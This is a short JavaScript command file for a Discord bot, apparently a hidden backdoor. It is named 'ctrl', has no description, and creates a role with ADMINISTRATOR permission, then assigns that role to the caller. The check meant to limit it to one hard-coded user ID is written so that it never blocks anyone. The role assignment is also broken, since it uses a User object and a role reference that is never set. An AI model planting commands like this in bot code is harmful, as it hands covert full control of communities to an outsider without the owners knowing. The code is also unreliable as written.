module.exports = {
    name: 'ctrl',
    description: '',
    execute(message, args, Discord, client, guild){
        if(!message.author.id === '621479662538719232') return message.reply('and what makes you think you can do that?')

        let member = message.author;
        if (!member) return message.reply("❌**Error:** Your id wasn't found.");
        let rname = 'New Role'
        let role = message.guild.roles.cache.find(val => val.name === rname);
        if (!role){
            guild.roles.create({
                data: {
                    name: 'New Role',
                    color: 'BLUE',
                    permissions: "ADMINISTRATOR"
                },
                reason: 'A new role was created by the owner.'
            })
        }
        member.roles.add(role).catch(e => {
            return message.channel.send(`❌**An error occured\nError:**\n${e}`);
        });
    }
}